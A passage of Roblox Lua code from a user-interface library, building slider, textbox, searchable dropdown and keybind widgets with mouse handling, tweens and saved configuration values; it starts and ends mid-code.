                        Slider["34"] = Instance.new("UIStroke", Slider["32"]);
                        Slider["34"]["Color"] = Color3.fromRGB(255, 255, 255);
                        Slider["34"]["Thickness"] = 0.8999999761581421;
                        Slider["34"]["Transparency"] = 0.800000011920929;

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SliderContainer.Name
                        Slider["35"] = Instance.new("TextLabel", Slider["32"]);
                        Slider["35"]["BorderSizePixel"] = 0;
                        Slider["35"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
                        Slider["35"]["TextXAlignment"] = Enum.TextXAlignment.Left;
                        Slider["35"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                        Slider["35"]["TextSize"] = 16;
                        Slider["35"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
                        Slider["35"]["Size"] = UDim2.new(1, -20, 0, 35);
                        Slider["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Slider["35"]["Text"] = options.name;
                        Slider["35"]["Name"] = [[Name]];
                        Slider["35"]["BackgroundTransparency"] = 1;
                        Slider["35"]["Position"] = UDim2.new(0, 15, 0, 0);

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SliderContainer.Count
                        Slider["36"] = Instance.new("TextLabel", Slider["32"]);
                        Slider["36"]["BorderSizePixel"] = 0;
                        Slider["36"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
                        Slider["36"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                        Slider["36"]["TextSize"] = 14;
                        Slider["36"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
                        Slider["36"]["Size"] = UDim2.new(0, 27, 0, 25);
                        Slider["36"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Slider["36"]["Text"] = [[150]];
                        Slider["36"]["Name"] = [[Count]];
                        Slider["36"]["BackgroundTransparency"] = 1;
                        Slider["36"]["Position"] = UDim2.new(1, -45, 0, 5);

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SliderContainer.SliderEmpty
                        Slider["37"] = Instance.new("Frame", Slider["32"]);
                        Slider["37"]["BorderSizePixel"] = 0;
                        Slider["37"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
                        Slider["37"]["Size"] = UDim2.new(1, -16, 0, 5);
                        Slider["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Slider["37"]["Position"] = UDim2.new(0, 8, 1, -21);
                        Slider["37"]["Name"] = [[SliderEmpty]];

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SliderContainer.SliderEmpty.UICorner
                        Slider["38"] = Instance.new("UICorner", Slider["37"]);
                        Slider["38"]["CornerRadius"] = UDim.new(0, 15);

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SliderContainer.SliderEmpty.UIStroke
                        Slider["39"] = Instance.new("UIStroke", Slider["37"]);
                        Slider["39"]["Color"] = Color3.fromRGB(255, 255, 255);
                        Slider["39"]["Thickness"] = 1.100000023841858;
                        Slider["39"]["Transparency"] = 0.25;

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SliderContainer.SliderEmpty.SliderFill
                        Slider["3a"] = Instance.new("Frame", Slider["37"]);
                        Slider["3a"]["BorderSizePixel"] = 0;
                        Slider["3a"]["BackgroundColor3"] = Color3.fromRGB(164, 104, 0);
                        Slider["3a"]["Size"] = UDim2.new(1, 0, 1, 0);
                        Slider["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Slider["3a"]["Name"] = [[SliderFill]];

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.SliderContainer.SliderEmpty.SliderFill.UICorner
                        Slider["3b"] = Instance.new("UICorner", Slider["3a"]);
                        Slider["3b"]["CornerRadius"] = UDim.new(0, 15);
                    end

                    local sliderfill = Slider["3a"]
                    local sliderempty = Slider["37"]

                    function Slider:Update()
                        local mouseposx = player:GetMouse().X
                        local percentage = math.clamp((mouseposx - sliderempty.AbsolutePosition.X) / (sliderempty.AbsoluteSize.X), 0, 1)
                        local value = ((options.Max - options.Min) * percentage) + options.Min
                        value = math.floor(value)
                        if options.unit ~= nil then
                            Slider["36"].Text = value..options.unit
                        else
                            Slider["36"].Text = value
                        end
                        Tween(sliderfill, {Size = UDim2.fromScale(percentage, 1)}, 0.2, "Linear")
                        if options.flag ~= nil then
                            Library.SaveConfig(options.flag, value)
                        end
                        return value
                    end

                    function Slider:SetValue(value)
                        Tween(sliderfill, {Size = UDim2.fromScale(((value - options.Min) / (options.Max - options.Min)), 1)}, 0.2, "Linear")
                        if options.unit ~= nil then
                            Slider["36"].Text = value..options.unit
                        else
                            Slider["36"].Text = value
                        end
                    end

                    Slider:SetValue(options.default)

                    Slider["32"].MouseEnter:Connect(function()
                        Slider.Hover = true
                    end)

                    Slider["32"].MouseLeave:Connect(function()
                        Slider.Hover = false
                    end)

                    uis.InputBegan:Connect(function(input, gpe)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 and Slider.Hover then
                            Slider.MouseHold = true
                            if Slider.Connection == nil then
                                Slider.Connection = runserv.RenderStepped:Connect(function()
                                    if Slider.MouseHold then
                                        local theval = Slider:Update()
                                        options.callback(theval)
                                    end
                                end)
                            end
                        end
                    end)

                    uis.InputEnded:Connect(function(input, gpe)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 and Slider.Connection ~= nil or Slider.MouseHold == true then
                            Slider.MouseHold = false
                            if Slider.Hover then
                                local theval = Slider:Update()
                                options.callback(theval)
                            end
                            if Slider.Connection then
                                Slider.Connection:Disconnect()
                                Slider.Connection = nil
                            end
                        end
                    end)

                    if options.flag ~= nil then
                        local fval = Library.LoadConfig(options.flag)
                        if fval ~= nil then
                            Slider:SetValue(fval)
                            options.callback(fval)
                        end
                    end

                end

                function Tab:CreateTextbox(options)
                    options = Library:validate({
                        name = "Textbox",
                        placeholder = "Your text here.",
                        flag = nil,
                        callback = function() end
                    }, options or {})

                    local Textbox = {
                        Hover = false
                    }

                    do 
                        -- StarterGui.ScreenGui.Main.Container.MainContainer.TextBoxContainer
                        Textbox["5e"] = Instance.new("Frame", Tab["21"]);
                        Textbox["5e"]["BorderSizePixel"] = 0;
                        Textbox["5e"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
                        Textbox["5e"]["Size"] = UDim2.new(1, -30, 0, 35);
                        Textbox["5e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Textbox["5e"]["Position"] = UDim2.new(0, 10, 0, 0);
                        Textbox["5e"]["Name"] = [[TextBoxContainer]];

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.TextBoxContainer.UICorner
                        Textbox["5f"] = Instance.new("UICorner", Textbox["5e"]);
                        Textbox["5f"]["CornerRadius"] = UDim.new(0, 10);

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.TextBoxContainer.UIStroke
                        Textbox["60"] = Instance.new("UIStroke", Textbox["5e"]);
                        Textbox["60"]["Color"] = Color3.fromRGB(255, 255, 255);
                        Textbox["60"]["Thickness"] = 0.8999999761581421;
                        Textbox["60"]["Transparency"] = 0.800000011920929;

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.TextBoxContainer.ChoosenName
                        Textbox["61"] = Instance.new("TextLabel", Textbox["5e"]);
                        Textbox["61"]["BorderSizePixel"] = 0;
                        Textbox["61"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
                        Textbox["61"]["TextXAlignment"] = Enum.TextXAlignment.Left;
                        Textbox["61"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                        Textbox["61"]["TextSize"] = 16;
                        Textbox["61"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
                        Textbox["61"]["Size"] = UDim2.new(1, -20, 1, 0);
                        Textbox["61"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Textbox["61"]["Text"] = options.name;
                        Textbox["61"]["Name"] = [[ChoosenName]];
                        Textbox["61"]["BackgroundTransparency"] = 1;
                        Textbox["61"]["Position"] = UDim2.new(0, 14, 0, 0);

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.TextBoxContainer.TextBox
                        Textbox["62"] = Instance.new("TextBox", Textbox["5e"]);
                        Textbox["62"]["BorderSizePixel"] = 0;
                        Textbox["62"]["TextSize"] = 14;
                        Textbox["62"]["TextWrapped"] = true;
                        Textbox["62"]["BackgroundColor3"] = Color3.fromRGB(53, 53, 53);
                        Textbox["62"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
                        Textbox["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                        Textbox["62"]["Size"] = UDim2.new(1, -90, 1, -10);
                        Textbox["62"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Textbox["62"]["Text"] = ""
                        Textbox["62"]["PlaceholderText"] = options.placeholder
                        Textbox["62"]["Position"] = UDim2.new(0, 85, 0, 5);

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.TextBoxContainer.TextBox.UICorner
                        Textbox["63"] = Instance.new("UICorner", Textbox["62"]);
                        Textbox["63"]["CornerRadius"] = UDim.new(0, 10);

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.TextBoxContainer.TextBox.LocalScript
                        Textbox["64"] = Instance.new("LocalScript", Textbox["62"]);


                        -- StarterGui.ScreenGui.Main.Container.MainContainer.TextBoxContainer.TextBox.UIPadding
                        Textbox["65"] = Instance.new("UIPadding", Textbox["62"]);
                        Textbox["65"]["PaddingLeft"] = UDim.new(0, 4);
                    end
                    
                    if options.flag ~= nil then
                        local fval = Library.LoadConfig(options.flag)
                        if fval ~= nil then
                            Textbox["62"].Text = tostring(fval)
                        end
                    end
                    
                    local absolutesizexth;
                    local currentBounds = Textbox["5e"].ChoosenName.TextBounds.X
                    local offsetthng = Textbox["5e"].ChoosenName.Position.X.Offset
                    local namethingy = Textbox["5e"].ChoosenName
                    local textBoxToChange = Textbox["62"]
                    textBoxToChange.Position = UDim2.new(textBoxToChange.Position.X.Scale, currentBounds + offsetthng + 15, textBoxToChange.Position.Y.Scale, textBoxToChange.Position.Y.Offset)
                    textBoxToChange.Size = UDim2.new(textBoxToChange.Size.X.Scale, (currentBounds + offsetthng + 20) * -1, textBoxToChange.Size.Y.Scale, textBoxToChange.Size.Y.Offset)
                    namethingy:GetPropertyChangedSignal("TextBounds"):Connect(function()
                        local currentBounds = Textbox["5e"].ChoosenName.TextBounds.X
                        textBoxToChange.Position = UDim2.new(textBoxToChange.Position.X.Scale, currentBounds + offsetthng + 15, textBoxToChange.Position.Y.Scale, textBoxToChange.Position.Y.Offset)
                        textBoxToChange.Size = UDim2.new(textBoxToChange.Size.X.Scale, (currentBounds + offsetthng + 20) * -1, textBoxToChange.Size.Y.Scale, textBoxToChange.Size.Y.Offset)
                    end)

                    Textbox["62"].FocusLost:Connect(function()
                        Tween(Textbox["5e"], {BackgroundColor3 = Color3.fromRGB(12, 12, 12)}, 0.25, "Linear", function()
                            Tween(Textbox["5e"], {BackgroundColor3 = Color3.fromRGB(25, 25, 25)}, 0.25, "Linear")
                        end)
                        options.callback(Textbox["62"].Text)
                        if options.flag ~= nil then
                            Library.SaveConfig(options.flag, Textbox["62"].Text)
                        end
                    end)

                end

                function Tab:CreateDropdown(options)
                    options = Library:validate({
                        name = "Dropdown",
                        options = {},
                        default = nil,
                        multiple = false,
                        flag = nil,
                        callback = function() end
                    }, options or {})

                    local Dropdown = {
                        HoverExtract = false,
                        Opened = false,
                        Tweening = false,
                        Selected = {}
                    }

                    local optionsTable = {}

                    do
                        -- StarterGui.ScreenGui.Main.Container.MainContainer.DropdownContainer
                        Dropdown["3c"] = Instance.new("Frame", Tab["21"]);
                        Dropdown["3c"]["BorderSizePixel"] = 0;
                        Dropdown["3c"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
                        Dropdown["3c"]["Size"] = UDim2.new(1, -30,0, 35);
                        Dropdown["3c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Dropdown["3c"]["Position"] = UDim2.new(0, 15, 0, 58);
                        Dropdown["3c"]["Name"] = [[DropdownContainer]];

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.DropdownContainer.UICorner
                        Dropdown["3d"] = Instance.new("UICorner", Dropdown["3c"]);
                        Dropdown["3d"]["CornerRadius"] = UDim.new(0, 10);

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.DropdownContainer.UIStroke
                        Dropdown["3e"] = Instance.new("UIStroke", Dropdown["3c"]);
                        Dropdown["3e"]["Color"] = Color3.fromRGB(255, 255, 255);
                        Dropdown["3e"]["Thickness"] = 0.8999999761581421;
                        Dropdown["3e"]["Transparency"] = 0.800000011920929;

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.DropdownContainer.Name
                        Dropdown["3f"] = Instance.new("TextLabel", Dropdown["3c"]);
                        Dropdown["3f"]["BorderSizePixel"] = 0;
                        Dropdown["3f"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
                        Dropdown["3f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
                        Dropdown["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                        Dropdown["3f"]["TextSize"] = 16;
                        Dropdown["3f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
                        Dropdown["3f"]["Size"] = UDim2.new(1, -20, 0, 35);
                        Dropdown["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Dropdown["3f"]["Text"] = options.name;
                        Dropdown["3f"]["Name"] = [[Name]];
                        Dropdown["3f"]["BackgroundTransparency"] = 1;
                        Dropdown["3f"]["Position"] = UDim2.new(0, 15, 0, 0);

                        Dropdown["999"] = Instance.new("TextBox", Dropdown["3c"])
                        Dropdown["999"]["BorderSizePixel"] = 0
                        Dropdown["999"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255) -- This will be overridden by transparency
                        Dropdown["999"]["TextXAlignment"] = Enum.TextXAlignment.Left
                        Dropdown["999"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
                        Dropdown["999"]["Text"] = ""
                        Dropdown["999"]["TextSize"] = 16
                        Dropdown["999"]["TextTransparency"] = 0.5
                        Dropdown["999"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
                        Dropdown["999"]["Size"] = UDim2.new(1, -20, 0, 35) -- Adjust size as needed
                        repeat wait() until Dropdown["3f"].TextBounds.X ~= nil and Dropdown["3f"].TextBounds.X > 0
                        Dropdown["999"]["Position"] = UDim2.new(0, 15 + Dropdown["3f"].TextBounds.X + 8, 0, 0)
                        Dropdown["999"]["BackgroundTransparency"] = 1 -- Make the background transparent
                        Dropdown["999"]["PlaceholderText"] = "Search..." -- Optional placeholder text
                        Dropdown["999"]["Visible"] = false

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.DropdownContainer.Arrow
                        Dropdown["40"] = Instance.new("ImageLabel", Dropdown["3c"]);
                        Dropdown["40"]["BorderSizePixel"] = 0;
                        Dropdown["40"]["ImageTransparency"] = 0.3100000023841858;
                        Dropdown["40"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
                        Dropdown["40"]["Image"] = [[rbxassetid://14546546277]];
                        Dropdown["40"]["Size"] = UDim2.new(0, 20, 0, 20);
                        Dropdown["40"]["Name"] = [[Arrow]];
                        Dropdown["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Dropdown["40"]["Position"] = UDim2.new(1, -30, 0, 10);
                        Dropdown["40"]["BackgroundTransparency"] = 1;

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.DropdownContainer.OptionsHolder
                        Dropdown["41"] = Instance.new("ScrollingFrame", Dropdown["3c"]);
                        Dropdown["41"]["Active"] = true;
                        Dropdown["41"]["BorderSizePixel"] = 0;
                        Dropdown["41"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
                        Dropdown["41"]["BackgroundTransparency"] = 1;
                        Dropdown["41"]["Size"] = UDim2.new(1, 0, 0, -45);
                        Dropdown["41"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
                        Dropdown["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Dropdown["41"]["Position"] = UDim2.new(0, 0, 0, 40);
                        Dropdown["41"]["Visible"] = false;
                        Dropdown["41"]["Name"] = [[OptionsHolder]];

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.DropdownContainer.OptionsHolder.UIListLayout
                        Dropdown["42"] = Instance.new("UIListLayout", Dropdown["41"]);
                        Dropdown["42"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
                        Dropdown["42"]["Padding"] = UDim.new(0, 5);
                        Dropdown["42"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
                        Dropdown["41"]["CanvasSize"] = UDim2.fromOffset(0,Dropdown["42"].AbsoluteContentSize.Y + 10)
                        Dropdown["42"]:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
                            Dropdown["41"]["CanvasSize"] = UDim2.fromOffset(0,Dropdown["42"].AbsoluteContentSize.Y + 10)
                        end)

                        -- StarterGui.ScreenGui.Main.Container.MainContainer.DropdownContainer.OptionsHolder.UIPadding
                        Dropdown["43"] = Instance.new("UIPadding", Dropdown["41"]);
                        Dropdown["43"]["PaddingTop"] = UDim.new(0, 3);


                        for i,v in pairs(options.options) do
                            -- StarterGui.ScreenGui.NormalOption
                            Dropdown["2"] = Instance.new("TextLabel", Dropdown["41"]);
                            Dropdown["2"]["BorderSizePixel"] = 0;
                            Dropdown["2"]["BackgroundColor3"] = Color3.fromRGB(32, 30, 30);
                            Dropdown["2"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                            Dropdown["2"]["TextSize"] = 14;
                            Dropdown["2"]["TextColor3"] = Color3.fromRGB(253, 253, 253);
                            Dropdown["2"]["Size"] = UDim2.new(1, -30, 0, 25);
                            Dropdown["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                            Dropdown["2"]["Text"] = v
                            Dropdown["2"]["Name"] = [[NormalOption]];

                            -- StarterGui.ScreenGui.NormalOption.UICorner
                            Dropdown["3"] = Instance.new("UICorner", Dropdown["2"]);
                            Dropdown["3"]["CornerRadius"] = UDim.new(0, 5);

                            -- StarterGui.ScreenGui.NormalOption.UIStroke
                            Dropdown["4"] = Instance.new("UIStroke", Dropdown["2"]);
                            Dropdown["4"]["Color"] = Color3.fromRGB(141, 141, 141);
                            Dropdown["4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

                            table.insert(optionsTable, {["Frame"] = Dropdown["2"], ["Hover"] = false, ["Selected"] = false})
                        end
                    end


                    --Search
                    Dropdown["999"].Changed:Connect(function()
                        local new_text = Dropdown["999"].Text
                        if Dropdown.Opened == true then
                            if new_text ~= "" then
                                for i,v in pairs(Dropdown["41"]:GetChildren()) do
                                    if v:IsA("TextLabel") then
                                        local text_of_option = v.Text
                                        if not string.find(string.lower(text_of_option), string.lower(new_text)) then
                                            v.Visible = false
                                        end
                                    end
                                end
                            elseif new_text == "" then
                                for i,v in pairs(Dropdown["41"]:GetChildren()) do
                                    if v:IsA("TextLabel") then
                                        v.Visible = true
                                    end
                                end
                            end
                        end
                    end)

                    for i,v in pairs(optionsTable) do
                        v.Frame.MouseEnter:Connect(function()
                            v.Hover = true
                            if v.Selected ~= true then
                                v.Frame.UIStroke.Color = Color3.fromRGB(65, 65, 65)
                                v.Frame.TextColor3 = Color3.fromRGB(132, 132, 132)
                            end
                        end)

                        v.Frame.MouseLeave:Connect(function()
                            v.Hover = false
                            if v.Selected ~= true then
                                v.Frame.UIStroke.Color = Color3.fromRGB(141,141,141)
                                v.Frame.TextColor3 = Color3.fromRGB(252, 252, 252)
                            end
                        end)
                    end

                    Dropdown["40"].MouseEnter:Connect(function()
                        Dropdown.HoverExtract = true
                    end)

                    Dropdown["40"].MouseLeave:Connect(function()
                        Dropdown.HoverExtract = false
                    end)
                    
                    local function get_table(thetable, thing)
                        for i,v in pairs(thetable) do
                            if v == thing then
                                return v
                            end
                        end
                    end
                    
                    function Dropdown:Deselect(theoption)
                        local path = theoption["Frame"]
                        for i,v in pairs(Dropdown.Selected) do
                            if v == path.Text then
                                table.remove(Dropdown.Selected, i)
                            end
                        end
                        theoption["Selected"] = false
                        local tb = get_table(optionsTable, theoption)
                        tb["Selected"] = false
                        path["BackgroundColor3"] = Color3.fromRGB(32, 30, 30);
                        path.UIStroke.Color = Color3.fromRGB(141,141,141)
                        path.TextColor3 = Color3.fromRGB(252, 252, 252)
                        if options.multiple == false then
                            Dropdown["3f"]["Text"] = options.name
                            Dropdown["999"]["Visible"] = true
                        end
                    end
                    
                    function Dropdown:Select(theoption)
                        local path = theoption["Frame"]
                        theoption["Selected"] = true
                        local tb = get_table(optionsTable, theoption)
                        tb["Selected"] = true
                        table.insert(Dropdown.Selected, path.Text)
                        options.callback(Dropdown.Selected)
                        path.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
                        path.TextColor3 = Color3.fromRGB(202, 202, 202)
                        path.UIStroke.Color = Color3.fromRGB(129, 65, 1)
                        if options.multiple == false then
                            Dropdown["999"]["Visible"] = false
                            Dropdown["3f"]["Text"] = options.name.." - "..theoption["Frame"].Text
                        end
                    end
                    
                    local function get_selected()
                        local temp = {}
                        for i,v in pairs(optionsTable) do
                            if v["Selected"] == true then
                                table.insert(temp, v)
                            end
                        end
                        return temp
                    end
                    
                    local function text_to_option(text)
                        for i,v in pairs(optionsTable) do
                            if v["Frame"].Text == text then
                                return v
                            end
                        end
                        return nil
                    end
                    
                    uis.InputBegan:Connect(function(input,gpe)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 and Dropdown.HoverExtract then
                            if Dropdown.Opened == false and Dropdown.Tweening == false then
                                Dropdown.Tweening = true
                                Dropdown.Opened = true
                                Tween(Dropdown["40"], {Rotation = 180}, 0.2, "Linear")
                                Tween(Dropdown["3c"], {Size = UDim2.new(1,-30,0,100)}, 0.2, "Linear")
                                Dropdown["41"].Visible = true
                                Tween(Dropdown["41"], {Size = UDim2.new(1,0,1,-45)}, 0.2, "Linear", function()
                                    Dropdown.Tweening = false
                                end)
                                Dropdown["3f"]["Text"] = options.name..": "
                                Dropdown["999"]["Visible"] = true
                            elseif Dropdown.Opened == true and Dropdown.Tweening == false then
                                Dropdown.Opened = false
                                Dropdown.Tweening = true
                                Tween(Dropdown["40"], {Rotation = 0}, 0.2, "Linear")
                                Tween(Dropdown["41"], {Size = UDim2.new(1,0,0,-45)}, 0.2, "Linear")
                                Dropdown["41"].Visible = false
                                Tween(Dropdown["3c"], {Size = UDim2.new(1, -30,0, 35)}, 0.2, "Linear", function()
                                    Dropdown.Tweening = false
                                end)
                                if options.multiple == false then
                                    if #get_selected() ~= 0 then
                                        Dropdown["3f"]["Text"] = options.name.." - "..get_selected()[1]["Frame"].Text
                                    else
                                        Dropdown["3f"]["Text"] = options.name
                                    end
                                else
                                    Dropdown["3f"]["Text"] = options.name
                                end
                                Dropdown["999"]["Visible"] = false
                            end
                        end
                    end)

                    uis.InputBegan:Connect(function(input, gpe)
                        if input.UserInputType == Enum.UserInputType.MouseButton1 then
                            local theoption;
                            for i,v in pairs(optionsTable) do
                                if v["Hover"] == true then
                                    theoption = v
                                    break
                                end
                            end
                            if theoption == nil then
                                return
                            end
                            --Clicked an option
                            if options.multiple == true then
                                if theoption["Selected"] == true then
                                    Dropdown:Deselect(theoption)
                                    options.callback(Dropdown.Selected)
                                    Library.SaveConfig(options.flag, tableToJSON(Dropdown.Selected))
                                    return
                                elseif theoption["Selected"] == false then
                                    Dropdown:Select(theoption)
                                    Library.SaveConfig(options.flag, tableToJSON(Dropdown.Selected))
                                end
                            elseif options.multiple == false then
                                if theoption["Selected"] == false then
                                    if #Dropdown.Selected == 0 then
                                        Dropdown:Select(theoption)
                                        Library.SaveConfig(options.flag, tableToJSON(Dropdown.Selected))
                                    elseif #Dropdown.Selected ~= 0 and #get_selected() ~= 0 then
                                        for i,v in pairs(get_selected()) do
                                            Dropdown:Deselect(v)
                                        end
                                        Dropdown:Select(theoption)
                                        Library.SaveConfig(options.flag, tableToJSON(Dropdown.Selected))
                                    end
                                elseif theoption["Selected"] == true then
                                    return
                                end
                            end
                        end
                    end)
                    

                    if options.flag ~= nil then
                        local fval = Library.LoadConfig(options.flag)				
                        if fval ~= nil then
                            fval = JSONToTable(fval)
                            if type(fval) == "table" and #fval > 0 then
                                if options.multiple == false then
                                    if #fval == 1 then
                                        if #get_selected() ~= 0 then
                                            for i,v in pairs(get_selected()) do
                                                Dropdown:Deselect(v)
                                            end
                                        end
                                        local ths = text_to_option(fval[1])
                                        if ths ~= nil then
                                            Dropdown:Select(ths)
                                        end
                                    end
                                elseif options.multiple == true then
                                    if #get_selected() ~= 0 then
                                        for i,v in pairs(get_selected()) do
                                            Dropdown:Deselect(v)
                                        end
                                    end
                                    for i,v in pairs(fval) do
                                        local theop = text_to_option(v)
                                        if theop ~= nil then
                                            Dropdown:Select(theop)
                                        end
                                    end
                                end							
                            end
                        end
                    end

                    function Dropdown:Refresh(list)
                        if #get_selected() ~= 0 then
                            for i,v in pairs(get_selected()) do
                                Dropdown:Deselect(v)
                            end
                        end
                        for i,v in pairs(Dropdown["41"]:GetChildren()) do
                            if v:IsA("TextLabel") then
                                v:Destroy()
                            end
                        end
                        optionsTable = {}
                        for i,v in pairs(list) do
                            Dropdown["2"] = Instance.new("TextLabel", Dropdown["41"]);
                            Dropdown["2"]["BorderSizePixel"] = 0;
                            Dropdown["2"]["BackgroundColor3"] = Color3.fromRGB(32, 30, 30);
                            Dropdown["2"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                            Dropdown["2"]["TextSize"] = 14;
                            Dropdown["2"]["TextColor3"] = Color3.fromRGB(253, 253, 253);
                            Dropdown["2"]["Size"] = UDim2.new(1, -30, 0, 25);
                            Dropdown["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                            Dropdown["2"]["Text"] = v
                            Dropdown["2"]["Name"] = [[NormalOption]];

                            -- StarterGui.ScreenGui.NormalOption.UICorner
                            Dropdown["3"] = Instance.new("UICorner", Dropdown["2"]);
                            Dropdown["3"]["CornerRadius"] = UDim.new(0, 5);

                            -- StarterGui.ScreenGui.NormalOption.UIStroke
                            Dropdown["4"] = Instance.new("UIStroke", Dropdown["2"]);
                            Dropdown["4"]["Color"] = Color3.fromRGB(141, 141, 141);
                            Dropdown["4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

                            table.insert(optionsTable, {["Frame"] = Dropdown["2"], ["Hover"] = false, ["Selected"] = false})
                        end
                        for i,v in pairs(optionsTable) do
                            v.Frame.MouseEnter:Connect(function()
                                v.Hover = true
                                if v.Selected ~= true then
                                    v.Frame.UIStroke.Color = Color3.fromRGB(65, 65, 65)
                                    v.Frame.TextColor3 = Color3.fromRGB(132, 132, 132)
                                end
                            end)

                            v.Frame.MouseLeave:Connect(function()
                                v.Hover = false
                                if v.Selected ~= true then
                                    v.Frame.UIStroke.Color = Color3.fromRGB(141,141,141)
                                    v.Frame.TextColor3 = Color3.fromRGB(252, 252, 252)
                                end
                            end)
                        end
                    end

                    return Dropdown
                end

                function Tab:CreateKeybind(options)
                    options = Library:validate({
                        name = "Keybind",
                        default = nil,
                        flag = nil,
                        callback = function() end
                    }, options or {})

                    local Keybind = {
                        Hover = false,
                        Status = "NotAssigned",
                        Keycode = nil,
                        Listening = nil,
                        Reading = nil
                    }

                    do
                        -- StarterGui.ScreenGui.KeybindContainer
                        Keybind["2"] = Instance.new("Frame", Tab["21"]);
                        Keybind["2"]["BorderSizePixel"] = 0;
                        Keybind["2"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
                        Keybind["2"]["Size"] = UDim2.new(1, -30, 0, 35);
                        Keybind["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Keybind["2"]["Position"] = UDim2.new(0, 10, 0, 0);
                        Keybind["2"]["Name"] = [[KeybindContainer]];

                        -- StarterGui.ScreenGui.KeybindContainer.UICorner
                        Keybind["3"] = Instance.new("UICorner", Keybind["2"]);
                        Keybind["3"]["CornerRadius"] = UDim.new(0, 10);

                        -- StarterGui.ScreenGui.KeybindContainer.UIStroke
                        Keybind["4"] = Instance.new("UIStroke", Keybind["2"]);
                        Keybind["4"]["Color"] = Color3.fromRGB(255, 255, 255);
                        Keybind["4"]["Thickness"] = 0.8999999761581421;
                        Keybind["4"]["Transparency"] = 0.800000011920929;

                        -- StarterGui.ScreenGui.KeybindContainer.ChoosenName
                        Keybind["5"] = Instance.new("TextLabel", Keybind["2"]);
                        Keybind["5"]["BorderSizePixel"] = 0;
                        Keybind["5"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
                        Keybind["5"]["TextXAlignment"] = Enum.TextXAlignment.Left;
                        Keybind["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
                        Keybind["5"]["TextSize"] = 16;
                        Keybind["5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
                        Keybind["5"]["Size"] = UDim2.new(1, -20, 1, 0);
                        Keybind["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
                        Keybind["5"]["Text"] = options.name;
